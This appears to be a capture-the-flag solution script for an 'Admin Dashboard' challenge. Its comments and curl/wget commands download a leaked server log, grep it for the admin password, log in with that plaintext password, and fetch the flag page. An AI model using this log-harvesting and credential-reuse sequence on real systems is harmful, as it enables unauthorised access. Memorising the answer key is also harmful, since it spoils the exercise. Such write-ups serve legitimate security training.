# Admin Dashboard
#Intercept index.php then log.php and S3cr3t_P4g3.php
#href server.log  ile leak in code
#wget http://skrctf.me:4002/server.log
#Look for weird password near the top
#cat server.log | grep username=admin
#Proceed to login using the username and password found
#http://skrctf.me:4001/login.php?username=admin&password=U_W1ll_N3V3R_GU355_TH15_P%4055w0rD%21LOL
#go S3cr3t_P4g3.php , put admin password and get flag

curl --cookie-jar ./admin-dash-cookie http://skrctf.me:4001/login.php?username=admin&password=U_W1ll_N3V3R_GU355_TH15_P%4055w0rD%21LOL

curl -s --cookie ./admin-dash-cookie http://skrctf.me:4001/S3cr3t_P4g3.php?password=U_W1ll_N3V3R_GU355_TH15_P%4055w0rD%21LOL | grep 'SKR{'

rm admin-dash-cookie
